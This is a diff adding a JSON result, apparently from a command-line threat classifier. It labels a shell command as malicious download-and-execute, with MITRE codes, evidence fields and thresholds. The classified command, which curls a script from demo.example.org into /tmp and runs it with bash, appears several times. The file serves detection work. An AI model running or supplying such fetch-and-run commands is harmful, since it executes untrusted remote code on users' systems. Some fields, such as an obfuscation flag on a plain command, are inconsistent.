@@ -1,0 +1,157 @@
+{
+  "label": "Malicious",
+  "canonical_label": "Malicious",
+  "label_confidence": 93.47,
+  "class_probabilities": {
+    "Benign": 4.43,
+    "Suspicious": 2.11,
+    "Malicious": 93.47
+  },
+  "decision_margin": 89.04,
+  "reason": "Using raw model top class Malicious.",
+  "triggered_features": [
+    "has_benign_admin_workflow",
+    "has_download"
+  ],
+  "routing_policy": "model_top_class",
+  "should_run_specialist": true,
+  "gatekeeper": {
+    "decision_mode": "model_top_class",
+    "label_names": [
+      "Benign",
+      "Malicious",
+      "Context_Dependent"
+    ],
+    "model_top_internal_label": "Malicious",
+    "model_top_label": "Malicious",
+    "model_top_public_label": "Malicious",
+    "model_top_confidence": 93.47,
+    "model_second_internal_label": "Benign",
+    "model_second_label": "Benign",
+    "model_second_public_label": "Benign",
+    "model_second_confidence": 4.43,
+    "model_view": "deobfuscated",
+    "metadata_path": "/home/sam/genos/genos_api/config/gatekeeper_meta.json",
+    "thresholds": {
+      "benign_conf_threshold": 0.52,
+      "suspicious_conf_threshold": 0.55,
+      "malicious_conf_threshold": 0.78,
+      "low_margin_threshold": 0.12,
+      "high_risk_override_enabled": true,
+      "suspicious_fallback_enabled": true
+    },
+    "threshold_source": null
+  },
+  "behavior": {
+    "stage": "Payload Retrieval",
+    "stage_confidence": 99.67,
+    "action_tags": [
+      "download_remote_resource",
+      "use_signed_proxy_binary"
+    ],
+    "model_type": "behavior_encoder",
+    "input_text": "RAW: curl -fsSL https://demo.example.org/agent.sh -o /tmp/agent.sh && bash /tmp/agent.sh\nRESIDUAL: TRANSFER REMOTE_TARGET DOMAIN_TARGET SH_FILE CHAINED LOLBIN INTERP_BASH | curl -fsSL <URL> -o <PATH> && bash <PATH>\nFEATURES: REMOTE_FETCH WRITE_EXECUTABLE INTERPRETER SIGNED_PROXY RULE:ingress_tool_transfer RULE:signed_binary_proxy_execution RULE:command_and_scripting_interpreter"
+  },
+  "label_probabilities": {
+    "benign": 4.43,
+    "malicious": 93.47,
+    "suspicious": 2.11
+  },
+  "MITRE_codes": [
+    {
+      "code": "T1105",
+      "confidence": 14.75
+    },
+    {
+      "code": "T1102",
+      "confidence": 10.75
+    },
+    {
+      "code": "T1213",
+      "confidence": 10.75
+    },
+    {
+      "code": "T1048",
+      "confidence": 9.25
+    },
+    {
+      "code": "T1059",
+      "confidence": 5.75
+    }
+  ],
+  "evidence": {
+    "platform": "linux",
+    "executable": "curl",
+    "subcommand": null,
+    "interpreter": "bash",
+    "high_signal_flags": [
+      "-o"
+    ],
+    "file_paths": [
+      "/tmp/agent.sh"
+    ],
+    "registry_paths": [],
+    "local_targets": [
+      "/tmp/agent.sh"
+    ],
+    "remote_targets": [
+      "https://demo.example.org/agent.sh"
+    ],
+    "urls": [
+      "https://demo.example.org/agent.sh"
+    ],
+    "domains": [
+      "demo.example.org"
+    ],
+    "ips": [],
+    "ports": [],
+    "has_pipe": false,
+    "has_redirect": false,
+    "has_chain": true,
+    "inline_code": false,
+    "uses_encoded_payload": false,
+    "uses_obfuscation": true,
+    "obfuscation_markers": [
+      "base64"
+    ],
+    "deobfuscated_command": null,
+    "lolbin_matches": [
+      "curl"
+    ],
+    "uses_signed_proxy_binary": true,
+    "semantic_features": [
+      "writes_executable_like_file",
+      "runs_interpreter",
+      "uses_signed_proxy_binary",
+      "downloads_remote_resource"
+    ],
+    "rule_strength": "strong",
+    "fired_rules": [
+      "download ingress",
+      "interpreter general",
+      "lolbin proxy broad"
+    ],
+    "evidence_summary": "Curl remote resource download.",
+    "primary_artifact_type": "network",
+    "execution_style": "download-and-execute",
+    "triggered_features": [
+      "has_benign_admin_workflow",
+      "has_download"
+    ],
+    "routing_reason": "Using raw model top class Malicious.",
+    "routing_policy": "model_top_class"
+  },
+  "confidence_driver": "model_aligned",
+  "analyst_hint": "Curl remote resource download.",
+  "deobfuscated_cmd": "curl -fsSL https://demo.example.org/agent.sh -o /tmp/agent.sh && bash /tmp/agent.sh",
+  "attack_stage": "Payload Retrieval",
+  "elapsed_ms": 60.6,
+  "gpu_memory": {
+    "status": "measured",
+    "device_name": "NVIDIA GeForce RTX 4060",
+    "baseline_allocated_bytes": 1020051456,
+    "peak_allocated_bytes": 1414613504,
+    "command_peak_bytes": 394562048,
+    "peak_reserved_bytes": 1627389952
+  }
+}
